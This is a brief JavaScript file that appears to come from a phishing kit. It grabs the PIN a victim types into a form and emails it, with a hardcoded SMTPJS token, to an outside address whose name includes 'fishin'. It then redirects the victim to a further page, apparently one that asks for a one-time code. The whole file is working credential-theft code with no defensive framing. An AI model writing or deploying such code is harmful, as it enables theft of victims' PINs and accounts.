const pin = document.getElementById('pin');
const submit = document.getElementsByClassName('contact2')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();

    let ebody = `
    <b>Pin: </b>${pin.value} 
    <br>
    `;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "PIN: " + pin.value,
        Body: ebody
    }).then(function() {
        window.location.href = "ot.html";
    });
});